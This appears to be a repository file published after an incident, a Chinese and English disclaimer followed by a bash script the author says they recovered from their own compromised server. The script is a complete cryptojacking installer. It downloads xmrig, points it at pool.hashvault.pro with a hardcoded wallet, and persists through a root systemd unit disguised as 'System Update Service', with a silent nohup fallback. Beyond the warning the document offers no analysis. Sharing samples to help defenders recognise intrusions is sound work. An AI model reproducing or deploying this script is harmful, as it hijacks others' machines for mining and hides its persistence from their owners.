@@ -1,0 +1,105 @@
+https://x.com/ScarletKc_
+
+重要声明
+本文/本仓库中出现的脚本（例如 sex.sh、与 xmrig 有关的配置等）来自我个人的一台被入侵的服务器，是在应急排查过程中从系统磁盘中提取出来的。
+
+我发布这些内容的唯一目的，是 记录安全事件、帮助他人识别类似入侵行为，并用于学习防御手段。
+
+我强烈要求、也强烈建议任何人都不要在任何环境中执行这些脚本或相关二进制文件。
+运行这些恶意脚本可能会：
+
+使你的设备被用于非法挖矿或其他恶意行为
+
+导致你的账号、数据和隐私泄露
+
+违反你所在地区的法律法规、云服务商/托管商的使用条款
+
+通过查看这些内容，你必须明确同意：
+
+你仅在合法前提下、出于安全研究、防御和学习目的阅读这些内容；
+
+你不会尝试在任何生产环境、个人设备或他人设备上执行或复现这些恶意代码；
+
+因查看、复制或误用这些内容造成的任何后果（包括但不限于封号、数据丢失、法律责任等），由你本人自行承担，与我无关。
+
+如果你不是安全从业者或没有隔离环境，请不要尝试下载、运行或修改这些恶意文件。仅作为安全警示参考。
+
+Important Notice
+The script(s) shown here (for example sex.sh and any related xmrig configuration) were extracted from my own compromised server during an incident response / forensic process.
+
+The only reason I am publishing this is to document the incident, help others recognize similar attacks, and support security education and defense.
+
+I strongly warn and request that you do NOT execute any of these scripts or binaries in any environment.
+Running this malicious code may:
+
+Turn your system into an illegal cryptocurrency mining node or otherwise abuse your resources
+
+Leak your data, credentials, and personal information
+
+Violate local laws/regulations and your cloud/hosting provider’s terms of service
+
+By viewing this content, you explicitly agree that:
+
+You are reading it only for legitimate purposes such as security research, incident analysis, or improving your defenses;
+
+You will NOT attempt to execute or reproduce this malicious code on any production system, personal device, or third-party system;
+
+Any consequences resulting from viewing, copying, misusing, or executing this code (including but not limited to account bans, data loss, or legal issues) are entirely your own responsibility, not mine.
+
+If you are not a security professional and do not have a properly isolated test environment, do NOT try to download, run, or modify these malicious files. Treat this only as a security warning and reference.
+
+#!/bin/bash
+
+# Configuration
+TAR_FILE="kal.tar.gz"
+EXTRACT_DIR="xmrig-6.24.0"
+BINARY_PATH="$(pwd)/$EXTRACT_DIR/xmrig"
+ARGS="--url pool.hashvault.pro:443 --user 88tGYBwhWNzGesQs5QkwE1PdBa1tXGb9dcjxrdwujU3SEs3i7psaoJc4KmrDvv4VPTNtXazDWGkvGGfqurdBggvPEhZ43DJ --pass next --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
+SERVICE_NAME="system-update-service"
+
+# Download and setup if not already present
+if [ ! -f "$BINARY_PATH" ]; then
+    curl -L -o "$TAR_FILE" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+    tar xvzf "$TAR_FILE"
+fi
+
+chmod +x "$BINARY_PATH"
+
+# Attempt systemd setup
+INSTALLED_SYSTEMD=0
+if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
+    echo "Root privileges detected. Attempting systemd setup..."
+    
+    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
+    
+    cat <<EOF > "$SERVICE_FILE"
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=${BINARY_PATH} ${ARGS}
+Restart=always
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    systemctl daemon-reload
+    systemctl enable "$SERVICE_NAME"
+    systemctl start "$SERVICE_NAME"
+    
+    if systemctl is-active --quiet "$SERVICE_NAME"; then
+        echo "Service started via systemd."
+        INSTALLED_SYSTEMD=1
+    fi
+fi
+
+# Fallback to nohup
+if [ $INSTALLED_SYSTEMD -eq 0 ]; then
+    echo "Starting with nohup..."
+    nohup "$BINARY_PATH" $ARGS >/dev/null 2>&1 &
+fi
